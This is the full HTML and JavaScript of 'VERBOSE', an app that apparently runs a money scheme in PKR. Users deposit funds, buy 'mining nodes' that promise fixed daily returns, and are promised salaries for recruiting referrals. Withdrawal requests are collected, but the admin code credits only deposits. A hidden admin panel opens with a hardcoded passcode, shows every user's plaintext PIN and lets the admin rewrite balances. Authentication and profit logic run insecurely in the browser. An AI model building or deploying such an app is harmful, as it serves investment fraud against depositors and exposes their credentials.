<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VERBOSE — Quantum Infrastructure</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #030303; --card: rgba(255,255,255,0.05); --border: rgba(255,255,255,0.1); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
  * { box-sizing: border-box; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
  body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }

  /* AUTH SCREENS */
  #authOverlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; align-items: center; justify-content: center; padding: 20px; }
  .auth-card { width: 100%; max-width: 400px; background: var(--card); border: 1px solid var(--border); border-radius: 40px; padding: 40px; backdrop-filter: blur(25px); text-align: center; }

  /* NAVIGATION DRAWER */
  .drawer { position: fixed; top: 0; left: -100%; width: 300px; height: 100%; background: rgba(5,5,5,0.98); backdrop-filter: blur(40px); z-index: 50000; border-right: 1px solid var(--border); padding: 50px 25px; }
  .drawer.open { left: 0; }
  .drawer-item { padding: 18px; border-radius: 20px; margin-bottom: 12px; background: var(--card); font-size: 12px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 15px; border: 1px solid transparent; }
  .drawer-item:hover { border-color: var(--neon); color: var(--neon); }

  header { display: flex; align-items: center; padding: 65px 25px 15px; position: relative; justify-content: space-between; border-bottom: 1px solid var(--border); }
  .logo-text { font-size: 22px; font-weight: 800; letter-spacing: 6px; text-shadow: 0 0 15px var(--neon); cursor: pointer; }
  .menu-toggle { font-size: 24px; cursor: pointer; color: var(--neon); }

  .page { max-width: 450px; margin: 0 auto; padding: 20px 20px 140px; display: none; }
  .active { display: block !important; animation: fadeIn 0.4s ease; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  .wallet-box { background: linear-gradient(135deg, #0a0a0a, #000); border: 1px solid var(--neon); padding: 40px 20px; border-radius: 45px; text-align: center; margin-bottom: 25px; box-shadow: 0 15px 35px rgba(0,247,255,0.1); }
  .node-card { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 25px; margin-bottom: 15px; position: relative; }
  
  input, select { width: 100%; padding: 18px; margin-top: 12px; border-radius: 20px; border: 1px solid var(--border); background: rgba(255,255,255,0.03); color: #fff; font-size: 14px; }
  .btn-action { width: 100%; padding: 20px; border-radius: 22px; border: none; font-weight: 800; cursor: pointer; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
  
  .admin-scroll { max-height: 300px; overflow-y: auto; background: #000; padding: 15px; border-radius: 20px; border: 1px solid var(--gold); }
  .admin-card { background: #111; padding: 15px; border-radius: 15px; margin-bottom: 10px; font-size: 11px; border-left: 4px solid var(--gold); }

  .nav { position: fixed; bottom: 30px; left: 20px; right: 20px; background: rgba(10,10,10,0.96); backdrop-filter: blur(25px); display: flex; justify-content: space-around; padding: 22px; border-radius: 45px; border: 1px solid var(--border); z-index: 1000; }
  .nav-item { font-size: 10px; opacity: 0.5; cursor: pointer; font-weight: 800; text-transform: uppercase; color: #fff; }
  .nav-item.active { opacity: 1; color: var(--neon); }

  #maintenanceOverlay { position: fixed; inset: 0; background: #000; z-index: 1000000; display: none; align-items: center; justify-content: center; text-align: center; padding: 40px; }
</style>
</head>
<body>

<div id="maintenanceOverlay">
    <div>
        <h1 style="color:var(--neon); letter-spacing:8px;">CORE OFFLINE</h1>
        <p style="opacity:0.6;">System infrastructure is undergoing a quantum upgrade.</p>
    </div>
</div>

<div id="authOverlay">
    <div class="auth-card" id="loginBox">
        <div class="logo-text" style="font-size:18px; margin-bottom:30px;">VERBOSE CLOUD</div>
        <input id="logPhone" type="number" placeholder="Phone Number">
        <input id="logPass" type="password" placeholder="Cloud PIN">
        <button class="btn-action" onclick="handleLogin()">ACCESS TERMINAL</button>
        <p style="font-size:10px; margin-top:20px; opacity:0.6;" onclick="toggleAuth(true)">New Agent? Create Identity</p>
    </div>
    <div class="auth-card" id="signupBox" style="display:none;">
        <div class="logo-text" style="font-size:18px; margin-bottom:30px;">NEW IDENTITY</div>
        <input id="regName" placeholder="Full Name">
        <input id="regPhone" type="number" placeholder="Phone Number">
        <input id="regPass" type="password" placeholder="Secure PIN">
        <input id="regRefer" placeholder="Referral Phone (Optional)">
        <button class="btn-action" onclick="handleSignup()">INITIALIZE IDENTITY</button>
        <p style="font-size:10px; margin-top:20px; opacity:0.6;" onclick="toggleAuth(false)">Already Authorized? Login</p>
    </div>
</div>

<div class="drawer" id="drawer">
    <div class="logo-text" style="font-size:16px; margin-bottom:40px; text-align:center;">CONTROL CENTER</div>
    <div class="drawer-item" onclick="tab('dash'); toggleMenu()">Dashboard</div>
    <div class="drawer-item" onclick="tab('teamPage'); toggleMenu()">My Squad (Team)</div>
    <div class="drawer-item" onclick="tab('salaryPage'); toggleMenu()">Salary Status</div>
    <div class="drawer-item" onclick="tab('infoPage'); toggleMenu()">Company Policy</div>
    <div class="drawer-item" style="color:var(--error); margin-top:60px;" onclick="logout()">Terminate Session</div>
</div>

<header>
    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
    <div class="logo-text" id="adminTrigger">VERBOSE</div>
    <div style="width:24px;"></div>
</header>

<div id="dash" class="page active">
    <div class="wallet-box">
        <span id="uNameDisplay" style="font-size:11px; opacity:0.6; letter-spacing:2px; text-transform:uppercase;">---</span>
        <div style="font-size:42px; font-weight:800; margin-top:10px;">PKR <span id="uBal">0.00</span></div>
    </div>
    <div id="activeNodeHUD" class="node-card" style="display:none; border-color:var(--success); text-align:center;">
        <small style="color:var(--success); font-weight:800; letter-spacing:1px;">ACTIVE MINING</small>
        <div id="timer" style="font-size:28px; font-weight:800; margin:10px 0;">24:00:00</div>
    </div>
</div>

<div id="teamPage" class="page">
    <h3 style="letter-spacing:1px;">MY SQUAD</h3>
    <div class="node-card" style="border-color:var(--accent);">
        <small>REFERRAL LINK (PHONE)</small>
        <div id="myRefCode" style="font-size:20px; font-weight:800; color:var(--neon); margin-top:5px;">---</div>
    </div>
    <div class="node-card">
        <div style="display:flex; justify-content:space-between;">
            <span>Team Size:</span> <b id="teamSize">0</b>
        </div>
        <div style="display:flex; justify-content:space-between; margin-top:10px;">
            <span>Active Nodes:</span> <b id="activeTeam">0</b>
        </div>
    </div>
</div>

<div id="salaryPage" class="page">
    <h3>SALARY PROGRAM</h3>
    <div class="node-card" id="sal20" style="opacity:0.5;">
        <b>Level 1 (20 Users)</b><br><small>Monthly Salary: 5,000 PKR</small>
        <div id="sal20Status" style="font-size:9px; margin-top:10px; color:var(--error);">NOT ELIGIBLE</div>
    </div>
    <div class="node-card" id="sal50" style="opacity:0.5;">
        <b>Level 2 (50 Users)</b><br><small>Monthly Salary: 15,000 PKR</small>
        <div id="sal50Status" style="font-size:9px; margin-top:10px; color:var(--error);">NOT ELIGIBLE</div>
    </div>
</div>

<div id="nodesPage" class="page">
    <h3 style="letter-spacing:1px;">RESOURCES</h3>
    <div id="nodeGrid"></div>
</div>

<div id="finance" class="page">
    <div class="node-card" style="border-color:var(--success);">
        <h3>DEPOSIT</h3>
        <input id="dAmt" type="number" placeholder="Amount">
        <input id="dTID" placeholder="Transaction ID (TID)">
        <button class="btn-action" onclick="sendReq('Deposit')">Submit Assets</button>
    </div>
    <div class="node-card" style="border-color:var(--error);">
        <h3>WITHDRAW</h3>
        <input id="wNum" type="number" placeholder="Account Number">
        <input id="wAmt" type="number" placeholder="Amount (Min 500)">
        <button class="btn-action" style="background:var(--error);" onclick="sendReq('Withdraw')">Request Payout</button>
    </div>
</div>

<div id="adminPage" class="page">
    <h2 style="color:var(--gold); text-align:center;">OVERLORD HUB</h2>
    <button class="btn-action" style="background:var(--error);" onclick="godToggleMaint()">TOGGLE MAINTENANCE</button>
    
    <small style="color:var(--gold); display:block; margin-top:20px;">SYSTEM REQUESTS</small>
    <div class="admin-scroll" id="admReqs"></div>

    <small style="color:var(--gold); display:block; margin-top:20px;">AGENT DIRECTORY</small>
    <div class="admin-scroll" id="admUsers"></div>

    <div class="node-card" style="border-color:var(--gold); margin-top:20px;">
        <input id="admT" placeholder="User Phone">
        <input id="admV" type="number" placeholder="Adjust Bal (+/-)">
        <button class="btn-action" style="background:var(--gold); color:#000;" onclick="godSync()">UPDATE CLOUD</button>
    </div>
</div>

<nav class="nav">
    <div class="nav-item active" onclick="tab('dash', this)">Home</div>
    <div class="nav-item" onclick="tab('nodesPage', this)">Nodes</div>
    <div class="nav-item" onclick="tab('finance', this)">Finance</div>
    <div class="nav-item" onclick="tab('teamPage', this)">Team</div>
</nav>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, update, onValue, get, set, push, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
    authDomain: "verbose-6c008.firebaseapp.com",
    projectId: "verbose-6c008",
    databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
    appId: "1:867100945312:web:315dfb48fb34496cee12c5"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  let user = localStorage.getItem('v_user');

  const plans = [{n:"Core v1",p:500,d:55},{n:"Core v2",p:1000,d:125},{n:"Core v3",p:2500,d:320},{n:"Core v4",p:5000,d:700}];

  // --- AUTH ---
  window.toggleAuth = (isSignup) => {
    document.getElementById('loginBox').style.display = isSignup ? 'none' : 'block';
    document.getElementById('signupBox').style.display = isSignup ? 'block' : 'none';
  };

  window.handleLogin = async () => {
    const p = document.getElementById('logPhone').value, pin = document.getElementById('logPass').value;
    const s = await get(ref(db, `users/${p}`));
    if(s.exists() && s.val().pass === pin) { localStorage.setItem('v_user', p); location.reload(); }
    else alert("Invalid Credentials");
  };

  window.handleSignup = async () => {
    const n = document.getElementById('regName').value, p = document.getElementById('regPhone').value, pin = document.getElementById('regPass').value, refCode = document.getElementById('regRefer').value;
    if(!n || !p || !pin) return alert("Fill all fields");
    const s = await get(ref(db, `users/${p}`));
    if(s.exists()) return alert("Already registered");
    
    await set(ref(db, `users/${p}`), { name:n, balance:0, pass:pin, hasActive:false, referredBy: refCode || "NONE" });
    if(refCode) {
        const rSnap = await get(ref(db, `users/${refCode}/team`));
        let team = rSnap.val() || []; team.push(p);
        await update(ref(db, `users/${refCode}`), { team: team });
    }
    localStorage.setItem('v_user', p); location.reload();
  };

  // --- ADMIN GOD MODE ---
  let clks = 0;
  document.getElementById('adminTrigger').onclick = () => { if(++clks >= 7) { if(prompt("Passcode?")==="nazim786") { tab('adminPage'); loadAdmin(); } clks=0; } };

  const loadAdmin = () => {
    onValue(ref(db, `admin/requests`), s => {
        const d = document.getElementById('admReqs'); d.innerHTML = "";
        if(s.exists()) Object.entries(s.val()).forEach(([id, r]) => {
            d.innerHTML += `<div class="admin-card"><b>${r.type}</b>: ${r.amt} PKR<br>ID: ${r.user} | TID: ${r.info}<br>
            <button onclick="godApprove('${id}','${r.user}',${r.amt},'${r.type}')" style="color:var(--success); background:none; border:none; font-weight:800;">APPROVE</button></div>`;
        });
    });
    onValue(ref(db, `users`), s => {
        const d = document.getElementById('admUsers'); d.innerHTML = "";
        if(s.exists()) Object.entries(s.val()).forEach(([num, u]) => {
            d.innerHTML += `<div class="admin-card"><b>${u.name}</b> (${num})<br>PIN: ${u.pass} | BAL: ${u.balance}</div>`;
        });
    });
  };

  window.godApprove = async (id, target, amt, type) => {
    const s = await get(ref(db, `users/${target}`));
    if(type === 'Deposit') await update(ref(db, `users/${target}`), { balance: (s.val().balance || 0) + Number(amt) });
    await remove(ref(db, `admin/requests/${id}`));
    alert("Approved!");
  };

  window.godSync = async () => {
    const t = document.getElementById('admT').value, v = Number(document.getElementById('admV').value);
    const s = await get(ref(db, `users/${t}`));
    if(s.exists()) await update(ref(db, `users/${t}`), { balance: (s.val().balance || 0) + v });
    alert("Cloud Synced");
  };

  window.godToggleMaint = async () => {
    const s = await get(ref(db, `admin/settings/maint`));
    await set(ref(db, `admin/settings/maint`), !s.val());
    alert("Maintenance Toggled");
  };

  // --- USER ENGINE ---
  const renderNodes = (active) => {
    const g = document.getElementById('nodeGrid'); g.innerHTML = "";
    plans.forEach(x => {
        g.innerHTML += `<div class="node-card"><b>${x.n} Node</b><br><small>Profit: PKR ${x.d}/day</small><br>
        <button class="btn-action" ${active?'disabled':''} onclick="buyNode(${x.p},${x.d},'${x.n}')">${active?'ACTIVE':'BUY '+x.p}</button></div>`;
    });
  };

  window.buyNode = async (p, d, name) => {
    const s = await get(ref(db, `users/${user}`));
    if(s.val().balance < p) return alert("Low balance");
    const t = Date.now();
    await update(ref(db, `users/${user}`), { balance: s.val().balance-p, daily:d, hasActive:true, activeName:name, startTime:t, lastProfitTime:t });
    alert("Mining Initialized!");
  };

  window.sendReq = (type) => {
    const amt = document.getElementById(type === 'Deposit' ? 'dAmt' : 'wAmt').value;
    const info = document.getElementById(type === 'Deposit' ? 'dTID' : 'wNum').value;
    push(ref(db, `admin/requests`), { user, type, amt, info, time: new Date().toLocaleString() });
    alert("Request Transmitted");
  };

  const runEngine = (d) => {
    if(!d.hasActive) return;
    document.getElementById('activeNodeHUD').style.display = 'block';
    const diff = (d.lastProfitTime + 86400000) - Date.now();
    if(diff <= 0) update(ref(db, `users/${user}`), { balance: d.balance + d.daily, lastProfitTime: Date.now() });
    else {
        let h = Math.floor(diff/3600000).toString().padStart(2,'0');
        let m = Math.floor((diff%3600000)/60000).toString().padStart(2,'0');
        let s = Math.floor((diff%60000)/1000).toString().padStart(2,'0');
        document.getElementById('timer').innerText = `${h}:${m}:${s}`;
    }
  };

  const trackTeam = (d) => {
    const team = d.team || [];
    document.getElementById('teamSize').innerText = team.length;
    document.getElementById('myRefCode').innerText = user;
    
    // Salary Check
    if(team.length >= 20) {
        document.getElementById('sal20').style.opacity = "1";
        document.getElementById('sal20Status').innerText = "ELIGIBLE - CONTACT ADMIN";
        document.getElementById('sal20Status').style.color = "var(--success)";
    }
    if(team.length >= 50) {
        document.getElementById('sal50').style.opacity = "1";
        document.getElementById('sal50Status').innerText = "ELIGIBLE - CONTACT ADMIN";
        document.getElementById('sal50Status').style.color = "var(--success)";
    }
  };

  window.toggleMenu = () => document.getElementById('drawer').classList.toggle('open');
  window.tab = (id, el) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    if(el) { document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); }
  };
  window.logout = () => { localStorage.clear(); location.reload(); };

  if(user) {
    document.getElementById('authOverlay').style.display = "none";
    onValue(ref(db, `admin/settings/maint`), s => { if(s.val() && !document.getElementById('adminPage').classList.contains('active')) document.getElementById('maintenanceOverlay').style.display='flex'; });
    onValue(ref(db, `users/${user}`), s => {
        const d = s.val();
        document.getElementById('uBal').innerText = (d.balance || 0).toLocaleString();
        document.getElementById('uNameDisplay').innerText = d.name;
        renderNodes(d.hasActive); runEngine(d); trackTeam(d);
    });
  }
</script>
</body>
</html>
